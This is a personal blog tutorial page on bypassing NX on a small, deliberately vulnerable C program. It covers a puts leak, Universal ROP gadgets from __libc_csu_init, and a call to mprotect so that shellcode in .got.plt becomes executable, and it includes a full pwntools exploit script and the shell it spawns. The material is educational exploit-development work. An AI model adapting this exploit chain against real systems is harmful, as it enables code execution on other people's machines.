<!DOCTYPE html>
<html lang="en-us">
    <head>
         
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <title>Shellcode Injection - Old but gold</title>
        
        <style>

    html body {
        font-family: 'Roboto Mono', sans-serif;
        background-color: white;
    }

    :root {
        --accent: #00a6d8;
        --border-width:  5px ;
    }

</style>


<link rel="stylesheet" href="https://raffaeleflorio.github.io/css/main.css">





<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto%20Mono">


 <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/solarized-dark.min.css"> 


<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous">


<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" integrity="sha384-wvfXpqpZZVQGK6TAh5PVlGOfQNHSoD2xbE+QkPxCAFlNEevoEH3Sl0sibVcOQVnN" crossorigin="anonymous">
 


    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/highlight.min.js"></script>

     <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/languages/go.min.js"></script>  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/languages/c.min.js"></script>  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/languages/bash.min.js"></script>  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/languages/python.min.js"></script>  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/languages/shell.min.js"></script> 

    <script>hljs.initHighlightingOnLoad();</script>







<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>


<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js" integrity="sha384-Tc5IQib027qvyjSMfHjOMaLkfuWVxZxUPnCJA7l2mCWNIpG9mGCD8wGNIcPD7Txa" crossorigin="anonymous"></script>


<script>$(document).on('click', function() { $('.collapse').collapse('hide'); })</script>
 <meta name="generator" content="Hugo 0.55.6" />
        

        

        
        
        <script type="text/javascript" async
          src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
        </script>
        
    </head>

    <body>
         
        <nav class="navbar navbar-default navbar-fixed-top">

            <div class="container">

                <div class="navbar-header">

                    <a class="navbar-brand visible-xs" href="#">Shellcode Injection - Old but gold</a>

                    <button class="navbar-toggle" data-target=".navbar-collapse" data-toggle="collapse">
                        <span class="icon-bar"></span>
                        <span class="icon-bar"></span>
                        <span class="icon-bar"></span>
                    </button>

                </div>

                <div class="collapse navbar-collapse">

                    
                        <ul class="nav navbar-nav">
                            
                                <li><a href="/">Home</a></li>
                            
                                <li><a href="/post/">Posts</a></li>
                            
                                <li><a href="/project/">Projects</a></li>
                            
                                <li><a href="/tags/">Tags</a></li>
                            
                        </ul>
                    

                    
                        <ul class="nav navbar-nav navbar-right">
                            
                                <li class="navbar-icon"><a href="https://github.com/raffaeleflorio/"><i class="fa fa-github"></i></a></li>
                            
                                <li class="navbar-icon"><a href="https://www.linkedin.com/in/raffaele-florio-79967919b/"><i class="fa fa-linkedin"></i></a></li>
                            
                                <li class="navbar-icon"><a href="https://instagram.com/r7florio/"><i class="fa fa-instagram"></i></a></li>
                            
                                <li class="navbar-icon"><a href="mailto:raffaeleflorio@protonmail.com"><i class="fa fa-envelope-o"></i></a></li>
                            
                                <li class="navbar-icon"><a href="/key"><i class="fa fa-key"></i></a></li>
                            
                        </ul>
                    

                </div>

            </div>

        </nav>


<main>

    <div class="item">

    
    
    

    
    

    <h4><a href="/post/mprotect-urop/">Shellcode Injection - Old but gold</a></h4>
    <h5>October 13, 2019</h5>
    
    <a href="https://raffaeleflorio.github.io/tags/pwn"><kbd class="item-tag">pwn</kbd></a>
    
    <a href="https://raffaeleflorio.github.io/tags/x86"><kbd class="item-tag">x86</kbd></a>
    
    <a href="https://raffaeleflorio.github.io/tags/shellcode"><kbd class="item-tag">shellcode</kbd></a>
    
    <a href="https://raffaeleflorio.github.io/tags/urop"><kbd class="item-tag">urop</kbd></a>
    
    <a href="https://raffaeleflorio.github.io/tags/rop"><kbd class="item-tag">rop</kbd></a>
    

</div>


    <br> <div class="text-justify">

<h1 id="intro">Intro</h1>

<p>Some time ago, a friend of mine (<a href="https://dag-tech.github.io/">dag-tech</a>), asked me about a technique to run a shellcode with <code>NX</code> enabled.
So he gave me a simple program:</p>

<pre><code class="language-c">//src.c
#include &lt;stdio.h&gt;
#include &lt;unistd.h&gt;

int main(int argc, char **argv) {
	char buf[16];
	puts(&quot;Can you pwn me????&quot;);
	read(0, buf, 512);
	return 0;
}
</code></pre>

<pre><code class="language-shell">$ gcc -z noexecstack -fno-stack-protector -o vuln src.c
$ checksec vuln
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
</code></pre>

<h1 id="the-approach">The approach</h1>

<p>The issue with <code>NX</code> is that we cannot execute code in writable memory segment. So we should find a way to disable, <strong>at run-time</strong>, this protection.</p>

<p>Fortunately the <code>mprotect</code> function, in libc, just do this:</p>

<pre><code>NAME
       mprotect â€” set protection of memory mapping

SYNOPSIS
       #include &lt;sys/mman.h&gt;

       int mprotect(void *addr, size_t len, int prot);

DESCRIPTION
       The mprotect() function shall change the access protections to be that specified by prot for those whole pages containing any part of the address space of the  process  starting  at
       address  addr  and  continuing for len bytes. The parameter prot determines whether read, write, execute, or some combination of accesses are permitted to the data being mapped. The
       prot argument should be either PROT_NONE or the bitwise-inclusive OR of one or more of PROT_READ, PROT_WRITE, and PROT_EXEC.

</code></pre>

<p>So here the exploit plan:</p>

<ul>
<li>Leak a function address in libc. In this way we can call mprotect</li>
<li>Find a memory segment where we could write the shellcode</li>
<li>Call mprotect to disable NX on that region</li>
<li>Jump to that region</li>
<li>Profit</li>
</ul>

<p>We leak the puts address and we write the shellcode starting from the <code>.got.plt</code> segment address.</p>

<h1 id="exploitation">Exploitation</h1>

<p>To build the ROP chain we use a <em>general techinique</em>, usable on any glibc x86_64 binary, called <code>Universal ROP</code>.</p>

<p>Basically we use the gadgets in the <code>__libc_csu_init</code> function, included by glibc in any x86_64 binary, to populate rdi, rsi and rdx.</p>

<p>These are, in fact, the first three registers used to pass argument to a function in x86_64 convention.</p>

<p>So we can call any function that accept <em>up</em> to three arguments, like <code>mprotect</code>.</p>

<p>Here the interesting part (so the gadgets..) of <code>__libc_csu_init</code> function:</p>

<pre><code>0x004011b0      4c89f2         mov rdx, r14
0x004011b3      4c89ee         mov rsi, r13
0x004011b6      4489e7         mov edi, r12d
0x004011b9      41ff14df       call qword [r15 + rbx*8]
0x004011bd      4883c301       add rbx, 1
0x004011c1      4839dd         cmp rbp, rbx
0x004011c4      75ea           jne 0x4011b0
0x004011c6      4883c408       add rsp, 8
0x004011ca      5b             pop rbx
0x004011cb      5d             pop rbp
0x004011cc      415c           pop r12
0x004011ce      415d           pop r13
0x004011d0      415e           pop r14
0x004011d2      415f           pop r15
						0x004011d3	5f	pop rdi
0x004011d4      c3             ret		0x004011d4	c3	ret
</code></pre>

<p><em>Note that there could be differences between glibc version. Currently I&rsquo;m using the <code>libc-2.29</code>. However the approach is the same.</em></p>

<p>We can easily identify:</p>

<ul>
<li><code>pop rdi</code> to set rdi, at <code>0x004011d3</code>.</li>
<li><code>pop r13</code> and <code>mov rsi, r13</code> to set rsi. At <code>0x004011ce</code> and <code>0x004011b3</code>.</li>
<li><code>pop r14</code> and <code>mov rdx, r14</code> to set rdx. At <code>0x004011d0</code> and <code>0x004011b0</code>.</li>
</ul>

<p>However there are two issues to overwhelm before we can set rsi and rdx. In fact after the <code>mov</code> there are:</p>

<ul>
<li>The <code>call qword [r15 + rbx*8]</code> at <code>0x004011b9</code></li>
<li>The <code>jne 0x4011b0</code> at <code>0x004011c4</code>.</li>
</ul>

<p>The latter should fail and this is is easily achievable because we control both <code>rbx</code> and <code>rbp</code> (thanks the pops at the bottom of the function). So we set rbx to 0 and rbp to 1.</p>

<p>The former requires a bit of work..
In fact <code>r15 + rbx*8</code> should point to an instruction in a executable segment and it should not interfer with our exploit..
However because rbx is equal to 0 the condition is reduced only to <code>r15</code>. And we control it thanks the <code>pop r15</code> at the bottom of the function.</p>

<p>Nonetheless.. What value <code>r15</code> should contain? A pointer to a function is an ideal candidate&hellip;</p>

<p><strong>BINGO!</strong></p>

<p>In every <code>ELF</code> executable there is a <code>.fini_array</code> section, that is an array of <em>pointer to functions</em>. These functions should be called when the program exit.</p>

<p>Let&rsquo;s analyze this section with <code>r2</code>.</p>

<pre><code>$ r2 -Ad vuln
[r2]&gt; iS
...
19 0x00002e18     8 0x00403e18     8 -rw- .fini_array
...
[r2]&gt; pxr 8 @0x00403e18
0x00403e18 0x0000000000401100   ..@..... @loc.__init_array_end 0
[r2]&gt; pdf @0x0000000000401100
    0x00401100      f30f1efa       endbr64
    0x00401104      803d212f0000.  cmp byte [obj.completed.7387], 0
,=&lt; 0x0040110b      7513           jne 0x401120
|   ...
|   ...
|  0x00401116      c6050f2f0000.  mov byte [obj.completed.7387], 1
|  0x0040111d      5d             pop rbp
`-&gt;0x00401120      c3             ret
</code></pre>

<p>So if [obj.completed.7387] is different than 0 this function acts like a <code>NOP</code>. And at <code>0x00401116</code> [obj.completed.7387] is set to 1&hellip;</p>

<p><strong>PERFECT! :D</strong></p>

<p>We have all elements in place.</p>

<p>So to recap: <code>r15</code> should contain the <code>.fini_array</code> address but before the first <code>ROP chain</code> we should call <code>0x00401116</code> to set <code>obj.completed.7387</code> to 1.
In this way the <code>call</code> acts like a <code>NOP</code>.</p>

<p>So here the exploit:</p>

<pre><code class="language-python">#!/usr/bin/python2

from pwn import *

prog = context.binary = ELF(os.getcwd() + &quot;/vuln&quot;, checksec=False)

if len(sys.argv) &gt; 1:
	host = sys.argv[1]
	port = 0
	t = remote(host, port)
else:
	t = prog.process()
	mprotect_offset = 0 # this is libc dependent

offset = 24
header = &quot;A&quot;*offset
shellcode = asm(shellcraft.sh())
gotplt  = prog.get_section_by_name(&quot;.got.plt&quot;).header.sh_addr
fini_array = prog.get_section_by_name(&quot;.fini_array&quot;).header.sh_addr
read = prog.plt[&quot;read&quot;]
puts = prog.plt[&quot;puts&quot;]
main = prog.symbols[&quot;main&quot;]

prdi     = 0x004011d3 # pop rdi

brdx     = 0x004011ca # pop rbx
		      # pop rbp
		      # pop r12
		      # pop r13
		      # `pr14 stuff`

pr14     = 0x004011d0 # pop r14
		      # pop r15

mr14trdx = 0x004011b0 # mov rdx, r14
		      # mov rsi, r13
		      # mov edi, r12d
		      # call qword [r15 + rbx*8]
		      # add rbx, 1
		      # cmp rbp, rbx
		      # jne 0x4011b0 -&gt; SHOULD FAIL
		      # add rsp, 8
		      # `brdx stuff`

completedToOne = 0x00401116 # mov byte [obj.completed], 1
			    # pop rbp

def init_urop():
	payload = p64(completedToOne)
	payload += &quot;J&quot;*8
	return payload

def urop(fn, rdi, rsi=0, rdx=0):
	payload = &quot;&quot;
	# set rsi and rdx
	payload += p64(brdx)
	payload += p64(0)   #rbx
	payload += p64(1)   #rbp
	payload += &quot;J&quot;*8    #r12
	payload += p64(rsi) #r13
	payload += p64(rdx) #r14
	payload += p64(fini_array) #r15
	payload += p64(mr14trdx)
	payload += &quot;J&quot;*56
	# set rdi
	payload += p64(prdi)
	payload += p64(rdi)
	# fn
	payload += p64(fn)
	return payload

# stage1: leak puts@libc, so get mprotect@libc.

payload = header
payload += init_urop()
payload += urop(puts, prog.got[&quot;puts&quot;])
payload += p64(main)

t.recvuntil(&quot;Can you pwn me????\n&quot;)
t.sendline(payload)

puts_libc = u64(t.recvline().replace('\n', '').ljust(8, &quot;\x00&quot;))
mprotect_libc = puts_libc - mprotect_offset
log.info(&quot;puts@libc: {:#x}&quot;.format(puts_libc))
log.info(&quot;mprotect@libc: {:#x}&quot;.format(mprotect_libc))

# stage2: read(0, gotplt, len(shellcode))
#         mprotect(gotplt, len(shellcode), PROT_READ | PROT_WRITE | PROT_EXEC)
#         jmp to the shellcode
payload = header
payload += urop(read, 0, gotplt, len(shellcode))
payload += urop(mprotect_libc, gotplt, len(shellcode), 7)
payload += p64(gotplt)

t.sendline(payload)
t.sendline(shellcode)

log.success(&quot;DONE&quot;)

t.recvrepeat(0.3)
t.interactive()
t.close()
</code></pre>

<pre><code class="language-shell">$ ./exploit.py
[+] Starting local process '/path/to/vuln'
[*] puts@libc: puts_address
[*] mprotect@libc: mprotect_address
[+] DONE
[*] Switching to interactive mode
$ echo hi :)
hi :)
$
</code></pre>

<h2 id="references">References</h2>

<ul>
<li><a href="https://www.slideshare.net/inaz2/rop-illmatic-exploring-universal-rop-on-glibc-x8664-en-41595384">Universal ROP</a></li>
</ul>
</div>

    
    

    

        <h4 class="page-header">Related</h4>

         <div class="item">

    
    
    

    
    

    <h4><a href="/post/thanksgiving-dinner-auctf2020/">AUCTF 2020 Writeup - Thanksgiving Dinner</a></h4>
    <h5>April 19, 2020</h5>
    
    <a href="https://raffaeleflorio.github.io/tags/ctf"><kbd class="item-tag">ctf</kbd></a>
    
    <a href="https://raffaeleflorio.github.io/tags/writeup"><kbd class="item-tag">writeup</kbd></a>
    
    <a href="https://raffaeleflorio.github.io/tags/pwn"><kbd class="item-tag">pwn</kbd></a>
    
    <a href="https://raffaeleflorio.github.io/tags/x86"><kbd class="item-tag">x86</kbd></a>
    
    <a href="https://raffaeleflorio.github.io/tags/auctf2020"><kbd class="item-tag">auctf2020</kbd></a>
    

</div>
  <div class="item">

    
    
    

    
    

    <h4><a href="/post/babypwn-hackcon19/">HackCon&#39;19 writeup - babypwn</a></h4>
    <h5>September 4, 2019</h5>
    
    <a href="https://raffaeleflorio.github.io/tags/ctf"><kbd class="item-tag">ctf</kbd></a>
    
    <a href="https://raffaeleflorio.github.io/tags/writeup"><kbd class="item-tag">writeup</kbd></a>
    
    <a href="https://raffaeleflorio.github.io/tags/pwn"><kbd class="item-tag">pwn</kbd></a>
    
    <a href="https://raffaeleflorio.github.io/tags/hackcon2019"><kbd class="item-tag">hackcon2019</kbd></a>
    
    <a href="https://raffaeleflorio.github.io/tags/x86"><kbd class="item-tag">x86</kbd></a>
    

</div>
  <div class="item">

    
    
    

    
    

    <h4><a href="/post/babyb0f-hackcon19/">HackCon&#39;19 writeup - baby b0f</a></h4>
    <h5>September 4, 2019</h5>
    
    <a href="https://raffaeleflorio.github.io/tags/ctf"><kbd class="item-tag">ctf</kbd></a>
    
    <a href="https://raffaeleflorio.github.io/tags/writeup"><kbd class="item-tag">writeup</kbd></a>
    
    <a href="https://raffaeleflorio.github.io/tags/pwn"><kbd class="item-tag">pwn</kbd></a>
    
    <a href="https://raffaeleflorio.github.io/tags/hackcon2019"><kbd class="item-tag">hackcon2019</kbd></a>
    
    <a href="https://raffaeleflorio.github.io/tags/x86"><kbd class="item-tag">x86</kbd></a>
    

</div>
 

    

    

</main>

        <footer>

            <p class="copyright text-muted">&copy; All rights reserved. Powered by <a href="https://gohugo.io">Hugo</a> and <a href="https://github.com/calintat/minimal">Minimal</a></p>

        </footer>
       
    </body>

</html>

